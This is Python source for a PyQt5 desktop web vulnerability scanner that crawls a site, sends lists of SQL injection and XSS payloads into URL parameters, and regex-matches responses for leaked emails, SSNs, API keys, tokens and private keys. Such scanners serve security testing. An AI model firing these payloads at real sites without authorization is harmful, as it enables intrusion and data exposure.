import sys
import threading
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar, 
                             QSpinBox, QGroupBox, QTabWidget, QTableWidget, QTableWidgetItem,
                             QHeaderView, QCheckBox, QMessageBox)
from PyQt5.QtCore import Qt, pyqtSignal, QObject
from PyQt5.QtGui import QFont, QColor

# Import the WebSecurityScanner class from your original code
import requests
from bs4 import BeautifulSoup
import urllib.parse
import colorama
import re
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Set

class WebSecurityScanner:
    def __init__(self, target_url: str, max_depth: int = 3):
        self.target_url = target_url
        self.max_depth = max_depth
        self.visited_urls: Set[str] = set()
        self.vulnerabilities: List[Dict] = []
        self.session = requests.Session()
        colorama.init()
        self.current_urls_scanned = 0
        self.scan_options = {
            'sql_injection': True,
            'xss': True,
            'sensitive_info': True
        }

    def normalize_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def crawl(self, url: str, depth: int = 0) -> None:
        if depth > self.max_depth or url in self.visited_urls:
            return

        try:
            self.visited_urls.add(url)
            self.current_urls_scanned += 1
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a', href=True)
            for link in links:
                next_url = urllib.parse.urljoin(url, link['href'])
                if next_url.startswith(self.target_url):
                    self.crawl(next_url, depth + 1)
        except requests.exceptions.Timeout:
            print(f"Timeout while crawling {url}, skipping...")
        except requests.exceptions.RequestException as e:
            print(f"Error crawling {url}: {e}")

    def check_sql_injection(self, url: str) -> None:
        if not self.scan_options['sql_injection']:
            return
            
        sql_payloads = [
            "'", 
            "1' OR '1'='1", 
            "' OR 1=1--", 
            "' UNION SELECT NULL--",
            "' OR 'a'='a",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1; --",
            "' OR 1=1; #",
            "' OR '1'='1' UNION SELECT 1,2,3 --",
            "' OR '1'='1' UNION SELECT NULL, NULL, NULL --",
            "' OR '1'='1' UNION SELECT database(), user(), version() --",
            "' OR '1'='1' AND SLEEP(5) --",
            "' OR '1'='1' AND 1=CONVERT(int, (SELECT @@version)) --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 --",
            "' OR '1'='1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --",
        ]
        
        for payload in sql_payloads:
            try:
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                for param in params:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={payload}")
                    response = self.session.get(test_url, timeout=10)
                    response.raise_for_status()
                    if any(error in response.text.lower() for error in ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle']):
                        self.report_vulnerability({'type': 'SQL Injection', 'url': url, 'parameter': param, 'payload': payload})
            except requests.exceptions.RequestException as e:
                print(f"Error testing SQL injection on {url}: {e}")

    def check_xss(self, url: str) -> None:
        if not self.scan_options['xss']:
            return
            
        xss_payloads = [
            "<script>alert('XSS')</script>", 
            "<img src=x onerror=alert('XSS')>", 
            "javascript:alert('XSS')",
            "<script>alert(document.cookie)</script>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<a href=javascript:alert(1)>Click Me</a>",
            "<div onmouseover=alert(1)>Hover Me</div>",
            "<input type=text value='<script>alert(1)</script>'>",
            "<marquee onstart=alert(1)>Scrolling Text</marquee>",
            "<video><source onerror=alert(1)>",
        ]
        
        for payload in xss_payloads:
            try:
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                for param in params:
                    test_url = url.replace(f"{param}={params[param][0]}", f"{param}={urllib.parse.quote(payload)}")
                    response = self.session.get(test_url, timeout=10)
                    response.raise_for_status()
                    if payload in response.text:
                        self.report_vulnerability({'type': 'Cross-Site Scripting (XSS)', 'url': url, 'parameter': param, 'payload': payload})
            except requests.exceptions.RequestException as e:
                print(f"Error testing XSS on {url}: {e}")

    def check_sensitive_info(self, url: str) -> None:
        if not self.scan_options['sensitive_info']:
            return
            
        sensitive_patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'api_key': r'api[_-]?key[_-]?([\'"|`])([a-zA-Z0-9]{32,45})\1',
            'password': r'password[=:]["\']?([^"\'\s]+)',
            'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*',
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'private_key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            'oauth_token': r'ya29\.[A-Za-z0-9_-]+',
            'basic_auth': r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)',
            'bearer_token': r'Bearer\s+([A-Za-z0-9._-]+)',
            'database_url': r'(postgres|mysql|mongodb)://[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+@[a-zA-Z0-9.-]+:[0-9]+/[a-zA-Z0-9_-]+',
        }
        
        try:
            response = self.session.get(url, timeout=10)
            response.raise_for_status()
            for info_type, pattern in sensitive_patterns.items():
                matches = re.finditer(pattern, response.text)
                for match in matches:
                    self.report_vulnerability({'type': 'Sensitive Information Exposure', 'url': url, 'info_type': info_type, 'pattern': pattern})
        except requests.exceptions.RequestException as e:
            print(f"Error checking sensitive information on {url}: {e}")

    def report_vulnerability(self, vulnerability: Dict) -> None:
        self.vulnerabilities.append(vulnerability)
        print(f"[VULNERABILITY FOUND]")
        for key, value in vulnerability.items():
            print(f"{key}: {value}")
        print()

    def scan(self) -> List[Dict]:
        print(f"Starting security scan of {self.target_url}")
        self.crawl(self.target_url)
        with ThreadPoolExecutor(max_workers=5) as executor:
            for url in self.visited_urls:
                executor.submit(self.check_sql_injection, url)
                executor.submit(self.check_xss, url)
                executor.submit(self.check_sensitive_info, url)
        return self.vulnerabilities

# Create a signal class for communicating between threads and GUI
class ScannerSignals(QObject):
    update_log = pyqtSignal(str)
    update_progress = pyqtSignal(int)
    update_vulnerability_table = pyqtSignal(dict)
    scan_complete = pyqtSignal(int, int)
    update_scanned_urls = pyqtSignal(int)

# Main Window class
class SecurityScannerWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Web Security Scanner")
        self.setMinimumSize(900, 700)
        
        # Create main widget and layout
        main_widget = QWidget()
        main_layout = QVBoxLayout()
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
        # Create tab widget
        tab_widget = QTabWidget()
        main_layout.addWidget(tab_widget)
        
        # Create Scanner Tab
        scanner_tab = QWidget()
        scanner_layout = QVBoxLayout()
        scanner_tab.setLayout(scanner_layout)
        tab_widget.addTab(scanner_tab, "Scanner")
        
        # Target URL input
        url_layout = QHBoxLayout()
        url_label = QLabel("Target URL:")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("https://example.com")
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)
        scanner_layout.addLayout(url_layout)
        
        # Scan options
        options_group = QGroupBox("Scan Options")
        options_layout = QVBoxLayout()
        options_group.setLayout(options_layout)
        
        # Max depth option
        depth_layout = QHBoxLayout()
        depth_label = QLabel("Max Crawl Depth:")
        self.depth_spinner = QSpinBox()
        self.depth_spinner.setMinimum(1)
        self.depth_spinner.setMaximum(10)
        self.depth_spinner.setValue(3)
        depth_layout.addWidget(depth_label)
        depth_layout.addWidget(self.depth_spinner)
        depth_layout.addStretch()
        options_layout.addLayout(depth_layout)
        
        # Vulnerability checks
        checks_layout = QHBoxLayout()
        self.sql_check = QCheckBox("SQL Injection")
        self.sql_check.setChecked(True)
        self.xss_check = QCheckBox("Cross-Site Scripting (XSS)")
        self.xss_check.setChecked(True)
        self.sensitive_check = QCheckBox("Sensitive Information")
        self.sensitive_check.setChecked(True)
        checks_layout.addWidget(self.sql_check)
        checks_layout.addWidget(self.xss_check)
        checks_layout.addWidget(self.sensitive_check)
        options_layout.addLayout(checks_layout)
        
        scanner_layout.addWidget(options_group)
        
        # Scan button and progress bar
        scan_controls = QHBoxLayout()
        self.scan_button = QPushButton("Start Scan")
        self.scan_button.clicked.connect(self.start_scan)
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        scan_controls.addWidget(self.scan_button)
        scan_controls.addWidget(self.progress_bar)
        scanner_layout.addLayout(scan_controls)
        
        # Status indicators
        status_layout = QHBoxLayout()
        self.urls_scanned_label = QLabel("URLs Scanned: 0")
        self.vulnerabilities_found_label = QLabel("Vulnerabilities Found: 0")
        status_layout.addWidget(self.urls_scanned_label)
        status_layout.addWidget(self.vulnerabilities_found_label)
        scanner_layout.addLayout(status_layout)
        
        # Log output
        log_group = QGroupBox("Scan Log")
        log_layout = QVBoxLayout()
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        log_layout.addWidget(self.log_output)
        log_group.setLayout(log_layout)
        scanner_layout.addWidget(log_group)
        
        # Create Results Tab
        results_tab = QWidget()
        results_layout = QVBoxLayout()
        results_tab.setLayout(results_layout)
        tab_widget.addTab(results_tab, "Results")
        
        # Vulnerabilities table
        self.vuln_table = QTableWidget()
        self.vuln_table.setColumnCount(4)
        self.vuln_table.setHorizontalHeaderLabels(["Type", "URL", "Parameter/Info", "Payload/Pattern"])
        self.vuln_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        results_layout.addWidget(self.vuln_table)
        
        # Export button
        self.export_button = QPushButton("Export Results")
        self.export_button.clicked.connect(self.export_results)
        results_layout.addWidget(self.export_button)
        
        # Create signals object
        self.signals = ScannerSignals()
        self.signals.update_log.connect(self.update_log)
        self.signals.update_progress.connect(self.update_progress)
        self.signals.update_vulnerability_table.connect(self.update_vulnerability_table)
        self.signals.scan_complete.connect(self.scan_complete)
        self.signals.update_scanned_urls.connect(self.update_scanned_urls)
        
        # Initialize variables
        self.scanner = None
        self.scan_thread = None
        self.total_vulnerabilities = 0
    
    def start_scan(self):
        target_url = self.url_input.text().strip()
        if not target_url:
            QMessageBox.warning(self, "Input Error", "Please enter a valid target URL")
            return
        
        if not (target_url.startswith('http://') or target_url.startswith('https://')):
            target_url = 'http://' + target_url
            self.url_input.setText(target_url)
        
        # Clear previous results
        self.log_output.clear()
        self.vuln_table.setRowCount(0)
        self.total_vulnerabilities = 0
        self.vulnerabilities_found_label.setText("Vulnerabilities Found: 0")
        self.urls_scanned_label.setText("URLs Scanned: 0")
        self.progress_bar.setValue(0)
        
        # Create scanner with custom output redirection
        max_depth = self.depth_spinner.value()
        self.scanner = WebSecurityScanner(target_url, max_depth)
        
        # Set scan options
        self.scanner.scan_options = {
            'sql_injection': self.sql_check.isChecked(),
            'xss': self.xss_check.isChecked(),
            'sensitive_info': self.sensitive_check.isChecked()
        }
        
        # Disable scan button during scan
        self.scan_button.setEnabled(False)
        self.scan_button.setText("Scanning...")
        
        # Start scan in a separate thread
        self.scan_thread = threading.Thread(target=self.run_scan)
        self.scan_thread.daemon = True
        self.scan_thread.start()
        
        # Setup progress monitoring thread
        self.monitor_thread = threading.Thread(target=self.monitor_progress)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
    
    def run_scan(self):
        # Override print function to redirect to GUI
        original_print = print
        def custom_print(*args, **kwargs):
            message = ' '.join(map(str, args))
            self.signals.update_log.emit(message)
            original_print(*args, **kwargs)
        
        # Monkey patch print function during scan
        import builtins
        builtins.print = custom_print
        
        try:
            # Override report_vulnerability to update GUI
            original_report = self.scanner.report_vulnerability
            def custom_report(vulnerability):
                self.signals.update_vulnerability_table.emit(vulnerability)
                original_report(vulnerability)
                self.total_vulnerabilities += 1
                self.signals.update_log.emit(f"Vulnerability found: {vulnerability['type']} at {vulnerability['url']}")
            
            self.scanner.report_vulnerability = custom_report
            
            # Run the scan
            self.signals.update_log.emit(f"Starting security scan of {self.scanner.target_url}")
            self.scanner.scan()
            
            # Scan complete
            self.signals.scan_complete.emit(len(self.scanner.visited_urls), self.total_vulnerabilities)
            
        except Exception as e:
            self.signals.update_log.emit(f"Error during scan: {str(e)}")
        finally:
            # Restore original print function
            builtins.print = original_print
    
    def monitor_progress(self):
        import time
        last_urls_count = 0
        
        while self.scan_thread.is_alive():
            if self.scanner:
                current_count = len(self.scanner.visited_urls)
                if current_count > last_urls_count:
                    self.signals.update_scanned_urls.emit(current_count)
                    last_urls_count = current_count
            time.sleep(0.5)
    
    def update_log(self, message):
        self.log_output.append(message)
        # Auto-scroll to bottom
        scrollbar = self.log_output.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def update_progress(self, value):
        self.progress_bar.setValue(value)
    
    def update_scanned_urls(self, count):
        self.urls_scanned_label.setText(f"URLs Scanned: {count}")
    
    def update_vulnerability_table(self, vulnerability):
        row = self.vuln_table.rowCount()
        self.vuln_table.insertRow(row)
        
        # Set type
        type_item = QTableWidgetItem(vulnerability['type'])
        type_item.setForeground(QColor(255, 0, 0))  # Red color for vulnerabilities
        self.vuln_table.setItem(row, 0, type_item)
        
        # Set URL
        self.vuln_table.setItem(row, 1, QTableWidgetItem(vulnerability['url']))
        
        # Set parameter or info type
        param = vulnerability.get('parameter', vulnerability.get('info_type', ''))
        self.vuln_table.setItem(row, 2, QTableWidgetItem(param))
        
        # Set payload or pattern
        payload = vulnerability.get('payload', vulnerability.get('pattern', ''))
        self.vuln_table.setItem(row, 3, QTableWidgetItem(str(payload)))
        
        self.vulnerabilities_found_label.setText(f"Vulnerabilities Found: {self.total_vulnerabilities}")
    
    def scan_complete(self, urls_count, vuln_count):
        self.scan_button.setEnabled(True)
        self.scan_button.setText("Start Scan")
        self.progress_bar.setValue(100)
        self.update_log(f"\nScan Complete!")
        self.update_log(f"Total URLs scanned: {urls_count}")
        self.update_log(f"Vulnerabilities found: {vuln_count}")
    
    def export_results(self):
        if self.vuln_table.rowCount() == 0:
            QMessageBox.information(self, "Export", "No results to export")
            return
        
        try:
            with open("security_scan_results.txt", "w") as f:
                f.write("Web Security Scanner Results\n")
                f.write("==========================\n\n")
                
                if self.scanner:
                    f.write(f"Target URL: {self.scanner.target_url}\n")
                    f.write(f"Total URLs scanned: {len(self.scanner.visited_urls)}\n")
                    f.write(f"Vulnerabilities found: {self.total_vulnerabilities}\n\n")
                
                f.write("Vulnerabilities:\n")
                f.write("---------------\n\n")
                
                for row in range(self.vuln_table.rowCount()):
                    vuln_type = self.vuln_table.item(row, 0).text()
                    url = self.vuln_table.item(row, 1).text()
                    param = self.vuln_table.item(row, 2).text()
                    payload = self.vuln_table.item(row, 3).text()
                    
                    f.write(f"Type: {vuln_type}\n")
                    f.write(f"URL: {url}\n")
                    f.write(f"Parameter/Info: {param}\n")
                    f.write(f"Payload/Pattern: {payload}\n")
                    f.write("\n" + "-" * 50 + "\n\n")
            
            QMessageBox.information(self, "Export", "Results exported to security_scan_results.txt")
        except Exception as e:
            QMessageBox.warning(self, "Export Error", f"Error exporting results: {str(e)}")

# Main application entry point
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = SecurityScannerWindow()
    window.show()
    sys.exit(app.exec_())